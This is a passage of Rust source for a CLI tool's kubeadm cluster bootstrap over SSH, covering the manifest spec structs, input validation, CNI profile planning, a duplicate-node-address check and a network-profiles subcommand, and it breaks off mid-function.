//! `delonix cluster apply -f cloud.yaml` — idempotent `kubeadm` bootstrap
//! over SSH, on already-live hosts (`kind: KubernetesCluster`). Does not create VMs — that is
//! `delonix vm create` (optionally with the golden image from `delonix image
//! vm build`). Idempotency WITHOUT a state file: each step checks the
//! real condition on the host (`remote::ssh_check`) before acting.
//!
//! **Simplifications of this v1** (see `AGENTS.md`): only `stacked` etcd
//! (co-located on the control-planes — the kubeadm default); sequential
//! (not parallel) execution across hosts; multi-control-plane HA requires
//! an explicit `spec.controlPlaneEndpoint` (kubeadm needs a stable endpoint
//! — LB/VIP — in front of several control-planes).

use super::kinds as k;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{Duration, Instant};

use clap::Subcommand;
use clap_complete::engine::ArgValueCandidates;
use delonix_model::{Error, Result};
use serde::Deserialize;

use super::manifest::{self, ManifestDoc};
use super::output;
use super::remote::{self, SshTarget};
use super::util::state_root;
use super::vmimage::VmImageStore;
use super::{etcd, k8s_recipes, kubeadm_config, lb, net_profiles_install, vm, vmimage};

/// `kubeadm` only auto-detects a CRI socket among a hardcoded list of
/// well-known paths (containerd/CRI-O/dockershim) — `delonix-cri`'s socket
/// (`dist/delonix-cri.service`'s `DELONIX_CRI_ADDR`) isn't one of them, so
/// without `--cri-socket` explicitly on BOTH `kubeadm init` and `kubeadm
/// join`, preflight fails trying to dial containerd's socket, which doesn't
/// exist on this image. Found live, first real end-to-end run of `cluster
/// kubeadm`/`cluster apply` (mode: vm) — this path had never gotten past VM
/// provisioning before (see AGENTS.md's "sem teste end-to-end real" note).
pub(crate) const DELONIX_CRI_SOCKET: &str = "unix:///run/delonix-cri.sock";

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct SshSpec {
    #[serde(default = "default_ssh_user")]
    user: String,
    /// `keyPath` is the canonical name (the one in the templates); `key` stays accepted
    /// so as not to break manifests written before this restructuring.
    #[serde(alias = "keyPath")]
    key: Option<PathBuf>,
    /// SSH port of every host in this cluster. `None` = the client's default (22).
    #[serde(default)]
    port: Option<u16>,
}

/// MANUAL `Default` (not derived) on purpose: the derive would give `user: ""`, and
/// since `ClusterSpec.ssh` is `#[serde(default)]`, a manifest WITHOUT an `ssh:` block
/// would end up with an EMPTY user instead of `delonix` — `default_ssh_user` only
/// applies when the block exists but is missing the field. Same pattern as
/// `EtcdSpec`/`KindModeSpec`.
impl Default for SshSpec {
    fn default() -> Self {
        SshSpec {
            user: default_ssh_user(),
            key: None,
            port: None,
        }
    }
}

fn default_ssh_user() -> String {
    "delonix".to_string()
}

#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct EtcdSpec {
    #[serde(default = "default_etcd_mode")]
    mode: String,
    /// Only meaningful with `mode: "external"` — the dedicated etcd hosts
    /// delonix bootstraps its own CA + cluster on. Reuses `HostSpec` verbatim
    /// (same shape `controlPlane.hosts`/`workers.hosts` already use).
    #[serde(default)]
    hosts: Vec<HostSpec>,
}

impl Default for EtcdSpec {
    fn default() -> Self {
        EtcdSpec {
            mode: default_etcd_mode(),
            hosts: Vec::new(),
        }
    }
}

fn default_etcd_mode() -> String {
    "stacked".to_string()
}

#[derive(Debug, Clone, Deserialize, schemars::JsonSchema)]
struct HostSpec {
    /// `address` is the canonical name in the templates; `ip` stays for
    /// compatibility with earlier manifests.
    #[serde(alias = "address")]
    ip: String,
    hostname: Option<String>,
}

impl HostSpec {
    fn label(&self) -> String {
        self.hostname.clone().unwrap_or_else(|| self.ip.clone())
    }
}

/// Field names accepted in the `spec` of `kind: KubernetesCluster`, for the unknown-field
/// guard (`manifest::spec_fields_for`). Cluster was the last Kind outside it:
/// its sub-specs are nested, which is why it was skipped, but the TOP level is
/// as flat as any other and a typo there was ignored in silence like the rest.
/// Kept aligned with `ClusterSpec` by `manifest::examples_nao_tem_campos_desconhecidos`.
pub(crate) const CLUSTER_SPEC_FIELDS: &[&str] = &[
    "cni",
    "controlPlane",
    "controlPlaneEndpoint",
    "etcd",
    "k8sVersion",
    "kind",
    "mode",
    "network",
    "podSubnet",
    "serviceSubnet",
    "ssh",
    "vm",
    "workers",
];

#[derive(Debug, Deserialize, schemars::JsonSchema)]
pub(crate) struct ClusterSpec {
    /// **The discriminator**: `kind` (containers here), `vm` (golden VMs) or
    /// `ssh` (remote hosts already live). One Kind, three paths — the common
    /// fields (k8sVersion/podSubnet/cni) are shared, the specific ones live in
    /// the mode's block.
    #[serde(default = "default_mode")]
    mode: String,
    #[serde(default)]
    ssh: SshSpec,
    #[serde(default)]
    etcd: EtcdSpec,
    #[serde(rename = "controlPlaneEndpoint")]
    control_plane_endpoint: Option<String>,
    #[serde(rename = "controlPlane", default)]
    control_plane: NodesSpec,
    #[serde(default)]
    workers: NodesSpec,
    #[serde(rename = "k8sVersion")]
    k8s_version: Option<String>,
    #[serde(rename = "podSubnet", default = "default_pod_subnet")]
    pod_subnet: String,
    #[serde(rename = "serviceSubnet", default = "default_service_subnet")]
    service_subnet: String,
    /// The pod network. `default` = the engine's own: kindnet in `mode: kind`,
    /// a node-local bridge in `mode: vm`/`ssh`, which only serves a ONE-node
    /// cluster (more nodes are refused before anything is created); `none` =
    /// install nothing, and every node stays `NotReady` until you apply your
    /// own CNI; `cilium`/`calico`/`flannel` = a selectable profile, pinned to a
    /// version and an artefact digest, installed and waited for by the
    /// bootstrap itself (see `cmd::net_profiles`).
    ///
    /// The accepted set is carried into the published JSON Schema as an
    /// `enum`, not only enforced at runtime: before this, `cni` was a plain
    /// `"type": "string"` there, so an editor validated `cni: cilum` as fine
    /// and the operator found out from DX-1701 after writing the manifest.
    /// Kept in step with `net_profiles::CNI_CHOICES` by
    /// `the_published_schema_offers_the_same_cni_values_as_the_code`.
    #[serde(default = "default_cni")]
    #[schemars(extend("enum" = ["default", "none", "cilium", "calico", "flannel"]))]
    cni: String,
    /// How the chosen pod network is configured. Only read when `cni` names a
    /// profile that reads it — a knob set on `cni: default`/`none` is REFUSED
    /// rather than ignored (DX-1702), because a dropped network setting is
    /// indistinguishable from one that was honoured until the traffic fails.
    #[serde(default)]
    network: NetworkBlock,
    #[serde(default)]
    kind: KindModeSpec,
    #[serde(default)]
    vm: VmModeSpec,
}

/// `spec.network` — the configuration of the pod network named by `spec.cni`.
///
/// Flat on purpose: every field here answers one question the bootstrap must
/// have an answer to before it runs, and each is validated by
/// `net_profiles::validate` against the chosen profile BEFORE any machine is
/// created. Nothing in this block has a per-profile default of its own; the
/// defaults live in the profile table, so there is exactly one place where
/// "the operator did not choose" becomes a value.
#[derive(Debug, Default, Deserialize, schemars::JsonSchema)]
pub(crate) struct NetworkBlock {
    /// Encapsulation / forwarding mode. Omit for the profile's default
    /// (`vxlan` everywhere it exists — the only mode that asks nothing of the
    /// network between the nodes).
    #[serde(default)]
    dataplane: Option<String>,
    /// `iptables` (default), `ipvs`, or `none` — the last meaning the CNI
    /// replaces kube-proxy, which changes the `kubeadm init` call itself and
    /// therefore cannot be turned on after the cluster exists.
    #[serde(rename = "kubeProxy", default)]
    kube_proxy: Option<String>,
    /// Pod MTU. Omit to have it computed from `nodeMtu` and the encapsulation
    /// overhead — an MTU that does not fit drops large packets in silence.
    #[serde(default)]
    mtu: Option<u32>,
    /// The nodes' own MTU, when it is not 1500. Only used to compute and
    /// bound `mtu`.
    #[serde(rename = "nodeMtu", default)]
    node_mtu: Option<u32>,
    /// `ipv4` (the only one implemented on this path — see DX-1706).
    #[serde(rename = "ipFamily", default)]
    ip_family: Option<String>,
    /// The node interface the dataplane should use, when autodetection is
    /// ambiguous. Omit to let the profile detect it.
    #[serde(default)]
    interface: Option<String>,
    /// Install Multus as an EXTENSION over the primary CNI (secondary
    /// interfaces through `NetworkAttachmentDefinition`).
    #[serde(default)]
    multus: bool,
    /// Install Hubble (Cilium's observability component).
    #[serde(default)]
    hubble: bool,
    /// Acknowledge that the chosen profile is experimental in this release.
    /// Without it, an experimental profile is refused (DX-1705) rather than
    /// silently used.
    #[serde(default)]
    experimental: bool,
    /// Install from the local artefact cache only, never from the network.
    #[serde(default)]
    offline: bool,
}

/// Field names accepted inside `spec.network`, for the nested unknown-field
/// guard. Kept aligned with [`NetworkBlock`] by
/// `net_profiles_block_fields_match_the_struct`.
pub(crate) const CLUSTER_NETWORK_FIELDS: &[&str] = &[
    "dataplane",
    "experimental",
    "hubble",
    "interface",
    "ipFamily",
    "kubeProxy",
    "mtu",
    "multus",
    "nodeMtu",
    "offline",
];

/// MANUAL `Default`, mirroring EXACTLY the `#[serde(default = ...)]` above
/// — a `ClusterSpec::default()` has to be indistinguishable from a deserialized
/// empty manifest. It exists mostly so the tests can use
/// `ClusterSpec { field: x, ..Default::default() }` and not break again
/// every time the schema gains a new field.
impl Default for ClusterSpec {
    fn default() -> Self {
        ClusterSpec {
            mode: default_mode(),
            ssh: SshSpec::default(),
            etcd: EtcdSpec::default(),
            control_plane_endpoint: None,
            control_plane: NodesSpec::default(),
            workers: NodesSpec::default(),
            k8s_version: None,
            pod_subnet: default_pod_subnet(),
            service_subnet: default_service_subnet(),
            cni: default_cni(),
            network: NetworkBlock::default(),
            kind: KindModeSpec::default(),
            vm: VmModeSpec::default(),
        }
    }
}

fn default_mode() -> String {
    "kind".to_string()
}
fn default_cni() -> String {
    "default".to_string()
}

/// Every value `spec.cni`/`--cni` may take, in every mode — the profile
/// table's own list, so the flag and the manifest cannot drift apart.
pub(crate) use super::net_profiles::CNI_CHOICES;

/// The pod-network question, answered before any machine exists (#799).
///
/// Pure, and shared by `validate()` (every manifest path) and the first line
/// of `provision_and_apply` (`cluster kubeadm`, which creates its VMs BEFORE
/// the spec it builds reaches `validate()`).
///
/// It used to live here as two hand-written refusals over a two-value list.
/// The list is now a table of PROFILES (`cmd::net_profiles`), and everything
/// this function used to decide — plus the dataplane, the kube-proxy mode, the
/// MTU, the CIDR arithmetic and the support level — is decided there, once,
/// and unit-tested without a host. What stays here is the call and the shape
/// of the request, because `provision_and_apply` has to ask the question
/// before it has a `ClusterSpec` to ask it with.
///
/// The two historical refusals are unchanged in meaning: an unknown value is
/// DX-1701, and `default` on a kubeadm cluster of more than one node is
/// DX-6701 (a node-local bridge routes nothing between nodes). `mode: kind` is
/// not refused for `default`: there it is kindnet, which does.
fn network_request(spec: &ClusterSpec, nodes: u32) -> super::net_profiles::NetworkRequest {
    network_request_parts(
        &spec.cni,
        &spec.network,
        &spec.pod_subnet,
        &spec.service_subnet,
        &spec.mode,
        nodes,
    )
}

/// The same request, from the loose parts, for the callers that do not have a
/// `ClusterSpec` yet.
///
/// Two of them: `provision_and_apply`, which creates its VMs before the spec
/// it builds reaches `validate()`, and the `cluster kubeadm` arm, which has to
/// ask BEFORE it creates the cluster's own network. Both used to carry their
/// own copy of this sixteen-field literal; a field added to `NetworkRequest`
/// and missed in one of them is a refusal that silently stops applying on one
/// path, so there is one builder.
fn network_request_parts(
    cni: &str,
    net: &NetworkBlock,
    pod_subnet: &str,
    service_subnet: &str,
    mode: &str,
    nodes: u32,
) -> super::net_profiles::NetworkRequest {
    super::net_profiles::NetworkRequest {
        cni: cni.to_string(),
        dataplane: net.dataplane.clone(),
        kube_proxy: net.kube_proxy.clone(),
        mtu: net.mtu,
        node_mtu: net.node_mtu,
        ip_family: net.ip_family.clone(),
        interface: net.interface.clone(),
        multus: net.multus,
        hubble: net.hubble,
        experimental: net.experimental,
        offline: net.offline,
        pod_subnet: pod_subnet.to_string(),
        service_subnet: service_subnet.to_string(),
        mode: mode.to_string(),
        nodes,
    }
}

/// The resolved network plan of a spec, or the refusal that stops the run
/// before anything is created.
fn network_plan(spec: &ClusterSpec, nodes: u32) -> Result<super::net_profiles::NetworkPlan> {
    super::net_profiles::validate(&network_request(spec, nodes))
}

/// Refuses a cluster whose nodes did not resolve to DISTINCT addresses
/// (DX-6702), before a single host is prepared.
///
/// BUG FOUND LIVE (`cluster kubeadm`, 3 VMs cloned from `k8s-golden`): the
/// image carried a non-empty `/etc/machine-id` — 33 bytes, byte-identical in
/// the image and in a booted clone, while the Ubuntu cloud base it was built
/// from ships that file EMPTY on purpose. systemd derives its DHCP client
/// identifier from machine-id, so all three clones presented ONE identifier
/// (RFC 4361 `ff` + IAID + DUID-EN, systemd's enterprise number 43793 —
/// decoded off the wire), and dnsmasq keys leases by client identifier
/// whenever one is present. Three distinct MACs were therefore treated as a
/// single client: `virbr0.status` held exactly ONE lease for three running
/// domains, and it migrated to whichever clone had asked last. Each clone had
/// genuinely held that address at its own create time and persisted it, so all
/// three VM records named 192.168.122.176 — and all three were still holding
/// it at once, with ARP for it answering the FIRST clone's MAC while the lease
/// named the LAST one's.
///
/// Why the check is here and not left to the failure downstream: with every
/// node target pointing at one machine, "Preparing N host(s)" opened N
/// concurrent SSH sessions to that one machine, which then raced each other on
/// the shared remote temp paths. The operator saw
/// `mv: cannot stat '/tmp/delonix-cri'` from `delonix-cri` install — a message
/// that names neither the real host nor the real cause, and sends the reader
/// into the CRI deploy code instead of at the image. Refused here, the
/// diagnostic names the shared client identifier and the nodes that collided.
///
/// Pure, so it is testable without libvirt or SSH. `nodes` is `(label,
/// address)` in provisioning order; collisions are reported in first-seen
/// order so the same cluster reads the same way twice.
fn check_distinct_node_addresses(nodes: &[(&str, &str)]) -> Result<()> {
    let mut groups: Vec<(&str, Vec<&str>)> = Vec::new();
    for &(label, addr) in nodes {
        match groups.iter_mut().find(|(a, _)| *a == addr) {
            Some((_, labels)) => labels.push(label),
            None => groups.push((addr, vec![label])),
        }
    }
    let shared: Vec<String> = groups
        .iter()
        .filter(|(_, labels)| labels.len() > 1)
        .map(|(addr, labels)| format!("{} -> {addr}", labels.join(", ")))
        .collect();
    if shared.is_empty() {
        return Ok(());
    }
    Err(Error::coded(
        6702,
        Error::Unavailable(super::po::tf(
            "these nodes did not get distinct addresses: {groups}. A kubeadm bootstrap opens one \
             SSH session per node, so several would configure the SAME machine and the rest none \
             at all. The usual cause is a golden image with a baked-in identity: a non-empty \
             /etc/machine-id, from which systemd derives one DHCP client identifier shared by \
             every clone, and a DHCP server keys leases by that identifier — so one lease exists \
             at a time and migrates between the clones. Nothing was bootstrapped. Rebuild the \
             image with `delonix vm image build` (it empties /etc/machine-id as its last step) \
             and create the cluster again — `delonix explain DX-6702` has the detail",
            &[("groups", &shared.join("; "))],
        )),
    ))
}

/// Whether `apply_ssh` installs the default CNI itself: only for a cluster of
/// exactly one node (`net_profiles::validate` refuses `default` above that).
/// One function for the plan line and the step, so the two cannot disagree.
fn installs_default_cni(spec: &ClusterSpec) -> bool {
    spec.cni == "default" && spec.control_plane.hosts.len() + spec.workers.hosts.len() == 1
}

/// Whether `apply_ssh` installs a selectable pod-network PROFILE
/// (`cilium`/`calico`/`flannel`) — the step that did not exist and is the
/// reason a multi-node kubeadm cluster could not be brought up here.
fn installs_profile(spec: &ClusterSpec) -> bool {
    super::net_profiles::Profile::parse(&spec.cni).is_some_and(|p| p.is_addon())
}

/// Whether `apply_ssh` waits for every node to be `Ready`. Never with
/// `cni: none`: the operator has not applied a CNI yet, so no node can be
/// `Ready`, and waiting would only end in the «0 nodes Ready» error.
///
/// A PROFILE always waits, whatever `wait_ready` says. The flag exists to
/// preserve the historical `cluster apply -f` timing for a path that installed
/// no CNI at all; a path that just installed one and did not look is the
/// «reports success, does nothing» failure in its purest form — the install is
/// only finished when the nodes are `Ready`.
fn waits_for_ready(spec: &ClusterSpec, wait_ready: bool) -> bool {
    if installs_profile(spec) {
        return true;
    }
    wait_ready && spec.cni != "none"
}

/// The steps `apply_ssh` announces before the first one runs. Built from the
/// same conditions as the steps themselves: a plan that promises a step
/// nobody runs is worse than no plan.
fn bootstrap_plan(spec: &ClusterSpec, wait_ready: bool) -> Vec<String> {
    let hosts = spec.control_plane.hosts.len() + spec.workers.hosts.len();
    let mut plan = vec![super::po::tf(
        "Preparing {n} host(s)",
        &[("n", &hosts.to_string())],
    )];
    if spec.etcd.mode == "external" {
        plan.push(super::po::t("Bootstrapping the etcd cluster").to_string());
    }
    plan.push(super::po::t("Bootstrapping control-plane (kubeadm init)").to_string());
    // HERE, and not at the end: `kubeadm init` has just written
    // `admin.conf`, and every step after this one can fail in a way whose
    // diagnosis needs the cached kubeconfig. DX-6704 tells the operator to
    // run `delonix cluster <name> -n <ns> describe daemonset <ds>`, which
    // resolves `<root>/clusters/<name>-kubeconfig.yaml` — fetched last, that
    // file did not exist yet at the moment the advice was printed, so the
    // only thing the two named commands could answer was DX-1000 "no
    // kubeconfig for cluster". Measured on a 3+2 VM cluster, 2026-10-20.
    plan.push(super::po::t("Fetching kubeconfig").to_string());
    if installs_default_cni(spec) {
        plan.push(super::po::t("Installing the default CNI (bridge, single node)").to_string());
    }
    // Right after `kubeadm init` and BEFORE the joins, which is what the
    // kubeadm documentation asks for: a node that joins a cluster with a pod
    // network already installed gets the agent scheduled onto it, instead of
    // sitting `NotReady` until something notices.
    if installs_profile(spec) {
        plan.push(super::po::tf(
            "Installing the {cni} pod network",
            &[("cni", &spec.cni)],
        ));
        if spec.network.multus {
            plan.push(super::po::t("Installing Multus").to_string());
        }
    }
    if spec.control_plane.hosts.len() > 1 {
        plan.push(super::po::tf(
            "Joining {n} more control-plane(s)",
            &[("n", &(spec.control_plane.hosts.len() - 1).to_string())],
        ));
    }
    if !spec.workers.hosts.is_empty() {
        plan.push(super::po::tf(
            "Joining {n} worker(s)",
            &[("n", &spec.workers.hosts.len().to_string())],
        ));
    }
    if waits_for_ready(spec, wait_ready) {
        plan.push(super::po::t("Waiting for all nodes to be Ready").to_string());
    }
    plan
}

/// The nodes of a role. **Unifies the three modes**: `kind`/`vm` say how many
/// (`replicas`), `ssh` says which ones (`hosts`) — because there the machines already exist
/// and we do not create them.
#[derive(Debug, Default, Deserialize, schemars::JsonSchema)]
struct NodesSpec {
    #[serde(default)]
    replicas: Option<u32>,
    #[serde(default)]
    hosts: Vec<HostSpec>,
}

impl NodesSpec {
    /// How many nodes this role asks for, however they were declared.
    fn count(&self) -> u32 {
        if !self.hosts.is_empty() {
            self.hosts.len() as u32
        } else {
            self.replicas.unwrap_or(0)
        }
    }
}

/// `spec.kind` block — only read in `mode: kind`.
#[derive(Debug, Deserialize, schemars::JsonSchema)]
struct KindModeSpec {
    #[serde(default = "default_node_image")]
    image: String,
    #[serde(rename = "apiServerPort")]
    api_server_port: Option<u16>,
}

impl Default for KindModeSpec {
    fn default() -> Self {
        KindModeSpec {
            image: default_node_image(),
            api_server_port: None,
        }
    }
}

fn default_node_image() -> String {
    super::kindmode::DEFAULT_NODE_IMAGE.to_string()
}

/// `spec.vm` block — only read in `mode: vm`.
#[derive(Debug, Default, Deserialize, schemars::JsonSchema)]
struct VmModeSpec {
    image: Option<String>,
    network: Option<String>,
    #[serde(default)]
    vcpus: Option<u32>,
    #[serde(default)]
    memory: Option<String>,
    #[serde(rename = "sshKey", default)]
    ssh_key: Option<PathBuf>,
    #[serde(rename = "bootTimeout", default)]
    boot_timeout: Option<String>,
}

fn default_pod_subnet() -> String {
    "10.244.0.0/16".to_string()
}
fn default_service_subnet() -> String {
    "10.96.0.0/12".to_string()
}

/// `host[:port]` — only the alphabet of a hostname/IPv4/IPv6 + port. Rejects
/// empty and anything starting with `-`/`:` (avoids ambiguity with
/// flags). **Security-critical**: this value goes directly into a
/// `format!` that becomes the BODY of a remote `bash -c` command (`kubeadm
/// init --control-plane-endpoint=...`, see `kubeadm_init`/`kubeadm_join`) —
/// without this validation, a malicious manifest injects arbitrary commands
/// as root on the remote host (`;`/`` ` ``/`$()`/`|` are not blocked by
/// `remote::shell_quote`, which only protects the local ssh→bash-c boundary, not the
/// CONTENT of the script). Security-audit finding, see AGENTS.md.
pub(crate) fn valid_endpoint(s: &str) -> bool {
    !s.is_empty()
        && !matches!(s.chars().next(), Some('-') | Some(':'))
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':'))
}

/// Simple CIDR (`10.244.0.0/16`) — only digits/`.`/`/`. Same security
/// rationale as [`valid_endpoint`] (used in `kubeadm init`'s `--pod-network-cidr`/
/// `--service-cidr`).
fn valid_cidr(s: &str) -> bool {
    !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_digit() || matches!(c, '.' | '/'))
}

/// Kubernetes version (`1.31` or `1.31.2`) — only digits/`.`. Same
/// security rationale as [`valid_endpoint`] (used in
/// `kubeadm init`'s `--kubernetes-version` AND in the apt repository of
/// `k8s_recipes::k8s_host_recipes`, run on ALL hosts).
pub(crate) fn valid_version(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit() || c == '.')
}

fn validate(spec: &ClusterSpec) -> Result<()> {
    if !matches!(spec.mode.as_str(), "kind" | "vm" | "ssh") {
        return Err(Error::Invalid(super::po::tf(
            "spec.mode '{mode}' invalid — use `kind` (local containers), `vm` (golden VMs) or \
             `ssh` (already-live remote hosts)",
            &[("mode", &spec.mode)],
        )));
    }
    if spec.mode == "ssh" && spec.control_plane.hosts.is_empty() {
        return Err(Error::Invalid(
            super::po::t(
                "spec.mode `ssh` requires `spec.controlPlane.hosts` — this mode does NOT create \
                 machines, they have to already exist and be reachable",
            )
            .into(),
        ));
    }
    if spec.mode != "ssh" && !spec.control_plane.hosts.is_empty() {
        return Err(Error::Invalid(super::po::tf(
            "spec.controlPlane.hosts only makes sense in `mode: ssh` (here it is `{mode}`) — in \
             kind/vm modes use `replicas`, which is delonix creating the nodes",
            &[("mode", &spec.mode)],
        )));
    }
    match spec.etcd.mode.as_str() {
        "stacked" => {}
        "external" => {
            // v1 scope: only `mode: ssh` supports external etcd — `kind`/`vm`
            // never forward `spec.etcd` into the hosts they provision (kind-mode
            // nodes are containers with no separate etcd-host concept; `mode:
            // vm`'s `provision_and_apply` only wires etcd through the
            // `--etcd-cluster` CLI flag, which always ends up as `mode: ssh`
            // internally). Rejecting here instead of silently dropping
            // `spec.etcd.hosts` avoids a silent-failure gap.
            if spec.mode != "ssh" {
                return Err(Error::Invalid(super::po::tf(
                    "etcd.mode 'external' is only supported with spec.mode 'ssh' in this version \
                     (here it is '{mode}') — use `mode: ssh` with explicit `etcd.hosts`, or \
                     `cluster kubeadm --etcd-cluster <N>`",
                    &[("mode", &spec.mode)],
                )));
            }
            if spec.etcd.hosts.is_empty() {
                return Err(Error::Invalid(
                    super::po::t(
                        "etcd.mode 'external' requires etcd.hosts (at least 1) — delonix creates \
                         and manages the etcd cluster on those hosts, they have to already exist \
                         and be reachable",
                    )
                    .into(),
                ));
            }
            if spec.etcd.hosts.len() > 1 && spec.etcd.hosts.len().is_multiple_of(2) {
                return Err(Error::Invalid(super::po::tf(
                    "etcd.hosts has {n} entries — an etcd cluster needs an ODD number of \
                     members for well-defined quorum (1 for dev/test, no HA; 3, 5, ... for \
                     production)",
                    &[("n", &spec.etcd.hosts.len().to_string())],
                )));
            }
            for h in &spec.etcd.hosts {
                if !valid_endpoint(&h.ip) {
                    return Err(Error::Invalid(super::po::tf(
                        "etcd host '{label}' has invalid ip: '{ip}'",
                        &[("label", &h.label()), ("ip", &h.ip)],
                    )));
                }
            }
        }
        other => {
            return Err(Error::Invalid(super::po::tf(
                "etcd.mode '{other}' invalid — use 'stacked' (default, co-located on the \
                 control-planes) or 'external' (dedicated etcd cluster, managed by delonix)",
                &[("other", other)],
            )));
        }
    }
    if spec.control_plane.count() == 0 {
        return Err(Error::Invalid(
            super::po::t(
                "spec.controlPlane empty — at least 1 node required (`replicas: 1` or 1 host)",
            )
            .into(),
        ));
    }
    if spec.control_plane.count() > 1 && spec.control_plane_endpoint.is_none() {
        return Err(Error::Invalid(
            super::po::t(
                "spec.controlPlaneEndpoint is required with more than 1 control-plane (kubeadm \
                 needs a stable endpoint — LB/VIP — in front of them; we do not invent one)",
            )
            .into(),
        ));
    }
    if let Some(ep) = &spec.control_plane_endpoint {
        if !valid_endpoint(ep) {
            return Err(Error::Invalid(super::po::tf(
                "spec.controlPlaneEndpoint '{ep}' invalid (only host/IP[:port])",
                &[("ep", ep)],
            )));
        }
    }
    if !valid_cidr(&spec.pod_subnet) {
        return Err(Error::Invalid(super::po::tf(
            "spec.podSubnet '{subnet}' invalid (CIDR format expected)",
            &[("subnet", &spec.pod_subnet)],
        )));
    }
    if !valid_cidr(&spec.service_subnet) {
        return Err(Error::Invalid(super::po::tf(
            "spec.serviceSubnet '{subnet}' invalid (CIDR format expected)",
            &[("subnet", &spec.service_subnet)],
        )));
    }
    if let Some(v) = &spec.k8s_version {
        if !valid_version(v) {
            return Err(Error::Invalid(super::po::tf(
                "spec.k8sVersion '{v}' invalid (only digits and dots, e.g.: '1.31')",
                &[("v", v)],
            )));
        }
    }
    for h in spec
        .control_plane
        .hosts
        .iter()
        .chain(spec.workers.hosts.iter())
    {
        if !valid_endpoint(&h.ip) {
            return Err(Error::Invalid(super::po::tf(
                "host '{label}' has invalid ip: '{ip}'",
                &[("label", &h.label()), ("ip", &h.ip)],
            )));
        }
    }
    // The whole network question at once — profile, support level, dataplane,
    // kube-proxy mode, MTU and the CIDR arithmetic — before a machine exists.
    // The plan is recomputed (not threaded through) by the paths that need it;
    // it is pure and cheap, and one source of truth beats one cached copy.
    let plan = network_plan(
        spec,
        spec.control_plane
            .count()
            .saturating_add(spec.workers.count()),
    )?;
    // And against the networks this host already has. Done here rather than
    // inside `net_profiles` so that module stays pure: reading the engine's
    // own networks is I/O, and a validation that cannot run offline is a
    // validation that gets skipped.
    check_env_overlap(&plan)?;
    Ok(())
}

// ---------------------------------------------------------------------------
// `delonix cluster network …` — the operation side
// ---------------------------------------------------------------------------

fn cmd_network(cmd: NetworkCmd) -> Result<()> {
    use super::net_profiles::{Profile, Support};
    match cmd {
        NetworkCmd::Profiles => {
            for p in [Profile::Cilium, Profile::Calico, Profile::Flannel] {
                let a = p.artefact();
                println!("{}", p.name());
                // The label column is a WIDTH, not spaces typed into the
                // literal: `no_message_carries_the_indentation_of_its_source_line`
                // refuses a run of six or more spaces baked into a message,
                // because alignment done that way drifts the moment a label
                // changes length and cannot be seen in a diff.
                println!("  {:<13}{}", "version", p.version());
                println!(
                    "  {:<13}{}",
                    "support",
                    match p.support() {
                        Support::Supported => "supported".to_string(),
                        Support::Experimental(_) => "EXPERIMENTAL".to_string(),
                    }
                );
                if let Support::Experimental(why) = p.support() {
                    println!("  {:<13}{why}", "why");
                }
                // The default is MARKED, not left to be inferred from the
                // order: an operator reading a list cannot tell which one they
                // get by omission, and the one they get by omission is the one
                // most clusters will run.
                println!(
                    "  dataplanes   {}",
                    p.dataplanes()
                        .iter()
                        .map(|d| if *d == p.default_dataplane() {
                            format!("{d} (default)")
                        } else {
                            (*d).to_string()
                        })
                        .collect::<Vec<_>>()
                        .join(", ")
                );
                println!(
                    "  kube-proxy   {} (default: {})",
                    p.kube_proxy_modes().join(", "),
                    p.kube_proxy_modes().first().copied().unwrap_or("")
                );
                // What the NODE has to carry for this profile's default
                // dataplane — the thing the golden image persists and the
                // preflight verifies.
                let mods = p.required_modules(p.default_dataplane());
                if !mods.is_empty() {
                    println!("  {:<13}{}", "modules", mods.join(", "));
                }
                println!(
                    "  NetworkPolicy {}",
                    if p.enforces_network_policy() {
                        "enforced by this profile"
                    } else {
                        "NOT enforced — a NetworkPolicy here is accepted by the apiserver and \
                         enforced by nobody"
                    }
                );
                println!("  {:<13}{}", "plugins", p.required_plugins().join(", "));
                if let Some(a) = a {
                    println!("  {:<13}{}", "artefact", a.url);
                    println!("  {:<13}{}", "sha256", a.sha256);
                }
                println!();
            }
            println!(
                "{}",
                super::po::tf(
                    "multus {version} is available as an EXTENSION over any of the above \
                     (`spec.network.multus: true`), never as a primary pod network.",
                    &[("version", super::net_profiles::MULTUS_VERSION)]
                )
            );
            Ok(())
        }
        NetworkCmd::Status { name } => cmd_network_status(name),
        NetworkCmd::Fetch { cni } => {
            let wanted: Vec<super::net_profiles::Artefact> = match cni.as_deref() {
                Some("multus") => vec![super::net_profiles::multus_artefact()],
                Some(other) => {
                    let p = Profile::parse(other)
                        .and_then(|p| p.artefact())
                        .ok_or_else(|| {
                            Error::Invalid(super::po::tf(
                                "'{cni}' is not a profile with an artefact to fetch",
                                &[("cni", other)],
                            ))
                        })?;
                    vec![p]
                }
                None => [Profile::Cilium, Profile::Calico, Profile::Flannel]
                    .iter()
                    .filter_map(|p| p.artefact())
                    .chain(std::iter::once(super::net_profiles::multus_artefact()))
                    .collect(),
            };
            for a in &wanted {
                // `offline: false` — this command exists precisely to be the
                // one run WITH reach.
                let path = net_profiles_install::fetch_artefact(a, false)?;
                println!("{}  {}", &a.sha256[..16], path.display());
            }
            println!(
                "{}",
                super::po::tf(
                    "{n} artefact(s) verified in {dir} — copy that directory to the machine that \
                     will bootstrap, and pass `--cni-offline` (or `spec.network.offline: true`)",
                    &[
                        ("n", &wanted.len().to_string()),
                        (
                            "dir",
                            &net_profiles_install::cache_dir().display().to_string()
                        ),
                    ]
                )
            );
            Ok(())
        }
    }
}

/// Desired vs observed, and a non-zero exit when they differ.
///
/// The desired side is this engine's own record; the observed side is the live
/// cluster. Reading only one of them is how a status command starts agreeing
/// with itself: the record says what we meant, and a CNI an operator applied
/// by hand is invisible to it.
fn cmd_network_status(name: Option<String>) -> Result<()> {
    let name = resolve_kubeconfig_name(name)?;
    let record = net_profiles_install::read_record(&name);
    // The same cached file `cluster kubeconfig` prints, derived the same way
    // (`<root>/clusters/<name>-kubeconfig.yaml`) — both modes write there.
    let kubeconfig = state_root()
        .join("clusters")
        .join(format!("{name}-kubeconfig.yaml"));
    if !kubeconfig.exists() {
        return Err(Error::NotFound(super::po::tf(
            "no cached kubeconfig for cluster \"{name}\" — nothing to ask",
            &[("name", &name)],
        )));
    }
    // Observed through the cached kubeconfig, with the system `kubectl`: the
